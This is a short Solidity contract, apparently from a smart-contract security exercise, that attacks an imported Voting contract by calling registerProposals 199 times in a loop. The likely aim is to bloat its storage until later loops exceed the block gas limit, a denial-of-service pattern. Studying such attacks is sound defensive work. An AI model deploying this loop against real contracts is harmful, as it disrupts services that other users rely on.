// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.28;

import "./33_gasLimit.sol";

contract attackGasLimit is Voting {
    Voting public voting;

    constructor(address _votingAddress) {
        voting = Voting(_votingAddress);
    }

    function attackStep() public {
        for (uint256 i = 1; i < 200; i++) {
            voting.registerProposals("attack");
        }
    }
}
